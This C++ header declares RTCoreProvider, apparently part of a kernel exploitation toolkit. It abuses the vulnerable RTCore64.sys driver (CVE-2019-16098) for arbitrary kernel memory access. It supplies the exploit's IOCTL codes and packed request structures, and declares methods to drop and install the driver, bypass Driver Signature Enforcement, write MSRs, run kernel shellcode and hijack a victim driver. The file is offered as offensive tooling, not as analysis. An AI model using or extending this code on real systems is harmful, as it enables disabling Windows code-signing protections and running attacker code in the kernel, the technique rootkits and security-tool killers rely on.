/**
 * @file RTCoreProvider.h
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the declaration of the RTCoreProvider class.
 *
 * The RTCoreProvider class is a concrete implementation of the IProvider
 * interface for the vulnerable Micro-Star RTCore64.sys driver. It handles
 * loading the driver and using its physical memory access vulnerability
 * to perform kernel memory operations.
 */

#pragma once

#include "IProvider.h"
#include <string>
#include <Windows.h>

namespace KernelMode {
    namespace Providers {
        /**
         * @class RTCoreProvider
         * @brief Implements the IProvider interface for the RTCore64.sys driver.
         *
         * This class uses the physical memory read/write vulnerability in
         * RTCore64.sys to achieve arbitrary kernel memory read and write
         * primitives. It includes logic to translate virtual addresses to
         * physical addresses by walking the page tables.
         */
        class RTCoreProvider : public IProvider {
        public:
            RTCoreProvider();
            ~RTCoreProvider() override;

            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override;
            void Deinitialize() override;
            std::wstring GetProviderName() const override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool ReadMsr(ULONG msrIndex, ULONG64* value) override;
            bool WriteMsr(ULONG msrIndex, ULONG64 value) override;
            
            bool BypassDSE() override;
            ULONG GetCapabilities() const override;
            const ProviderLoadData* GetLoadData() const override;
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;

            // KDU-style kernel memory management and execution
            uintptr_t AllocateKernelMemory(size_t size, uintptr_t* physicalAddress = nullptr) override;
            bool FreeKernelMemory(uintptr_t virtualAddress, size_t size) override;
            bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter = 0) override;
            
            // LIFECYCLE-011: Error state tracking
            bool IsInErrorState() const override { return inErrorState_; }
            bool IsInitialized() const override { return isInitialized_ && !inErrorState_; }

            // Method to set victim driver details for execution hijacking
            void SetVictimDetails(const std::wstring& victimDeviceName, const std::wstring& victimServiceName);

        private:
            // RTCore64 IOCTL Definitions (Authentic KDU/CVE-2019-16098)
            static const DWORD IOCTL_RTCORE_READMSR = 0x80002030;
            static const DWORD IOCTL_RTCORE_WRITEMSR= 0x80002034;
            static const DWORD IOCTL_RTCORE_READVM  = 0x80002048;
            static const DWORD IOCTL_RTCORE_WRITEVM = 0x8000204C;

            /**
             * @struct RTCORE_MSR_REQUEST
             * @brief Structure for RTCore64 MSR IOCTL
             */
            #pragma pack(push, 1)
            struct RTCORE_MSR_REQUEST {
                DWORD Register;
                DWORD ValueHigh;
                DWORD ValueLow;
            };
            #pragma pack(pop)

            /**
             * @struct RTCORE_REQUEST
             * @brief Structure for the RTCore64 IOCTL request (Authentic KDU)
             */
            #pragma pack(push, 1)
            struct RTCORE_REQUEST {
                uintptr_t Unknown0;
                uintptr_t Address;      // Virtual Address
                uintptr_t Unknown1;
                uint32_t Size;          // 1, 2, or 4 bytes
                uint32_t Value;         // Read: Result, Write: Value
                uintptr_t Unknown2;
                uintptr_t Unknown3;
            };
            #pragma pack(pop)

            /**
             * @brief Extracts the embedded driver resource to a temporary file.
             * @return True if extraction is successful, false otherwise.
             */
            bool DropDriver();

            /**
             * @brief Installs the RTCore64 driver as a Windows service.
             * @return True if installation is successful, false otherwise.
             */
            bool InstallDriverService();

            /**
             * @brief Opens a handle to the RTCore64 device for IOCTL communication.
             * @return True if device handle opened successfully, false otherwise.
             */
            bool OpenDeviceHandle();

            /**
             * @brief Reads a value of a given size from a physical address.
             * @param physicalAddress The physical address to read from.
             * @param value The variable to store the read data.
             * @param size The number of bytes to read (1, 2, or 4).
             * @return True on success, false otherwise.
             */
            bool ReadPhysical(uintptr_t physicalAddress, uint32_t& value, uint32_t size);

            /**
             * @brief Writes a value of a given size to a physical address.
             * @param physicalAddress The physical address to write to.
             * @param value The value to write.
             * @param size The number of bytes to write (1, 2, or 4).
             * @return True on success, false otherwise.
             */
            bool WritePhysical(uintptr_t physicalAddress, uint32_t value, uint32_t size);

            /**
             * @brief Performs DSE bypass using RTCore64 physical memory access.
             * @return True if DSE bypass succeeds, false otherwise.
             */
            bool PerformDSEBypass();

            /**
             * @brief Finds the g_CiOptions variable address in kernel memory.
             * @return Address of g_CiOptions, or 0 on failure.
             */


            /**
             * @brief Executes shellcode in kernel mode using RTCore64 physical access.
             * @param shellcode Pointer to shellcode bytes.
             * @param size Size of shellcode in bytes.
             * @return Result of shellcode execution, or 0 on failure.
             */
            uintptr_t ExecuteKernelShellcodeRTCore(BYTE* shellcode, size_t size);

            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring driverPath;
            uintptr_t pml4Base;
            bool isInitialized_ = false;     // LIFECYCLE-011: Initialization tracking
            bool inErrorState_ = false;      // LIFECYCLE-011: Error state tracking
            static ProviderLoadData loadData;

            const std::wstring deviceName = L"\\DosDevices\\RTCore64";
            const std::wstring serviceName = L"RTCore64";
            const std::wstring driverFileName = L"RTCore64.sys";
            
            // Victim details for safe execution
            std::wstring victimDeviceName = L"";
            std::wstring victimServiceName = L"";
        };
    }
}